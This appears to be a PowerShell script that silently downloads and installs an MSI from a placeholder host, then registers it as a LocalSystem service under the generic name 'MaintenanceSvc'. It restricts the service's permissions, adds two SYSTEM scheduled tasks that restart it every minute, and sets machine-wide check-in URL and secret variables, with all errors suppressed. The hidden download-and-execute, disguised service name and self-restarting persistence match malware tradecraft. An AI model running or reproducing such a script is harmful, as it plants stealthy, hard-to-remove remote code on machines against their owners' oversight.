$ErrorActionPreference = 'SilentlyContinue'
$msi = "$env:TEMP\BackupAgent.msi"
Invoke-WebRequest -Uri "https://example.invalid:8443/BackupAgent.msi" -OutFile $msi
Start-Process msiexec.exe -ArgumentList "/i `"$msi`" /qn /norestart" -Wait -WindowStyle Hidden

$bin = "C:\Program Files\Contoso Backup\BackupWorker.exe"
sc.exe create MaintenanceSvc binPath= "`"$bin`"" start= auto obj= LocalSystem
sc.exe sdset MaintenanceSvc "D:(A;;CCLCSWRPWPDTLOCRRC;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)"
sc.exe start MaintenanceSvc

schtasks.exe /Create /TN "MaintenanceCheck" /TR "sc.exe start MaintenanceSvc" /SC MINUTE /MO 1 /RU SYSTEM /F
schtasks.exe /Create /TN "MaintenanceRestore" /TR "powershell -c Start-Service MaintenanceSvc" /SC MINUTE /MO 1 /RU SYSTEM /F

[Environment]::SetEnvironmentVariable("BACKUP_CHECKIN_URL", "https://example.invalid:8443/checkin", "Machine")
[Environment]::SetEnvironmentVariable("BACKUP_CHECKIN_SECRET", "enroll-token", "Machine")
New-Item -ItemType Directory -Force -Path "C:\ProgramData\Contoso Backup" | Out-Null
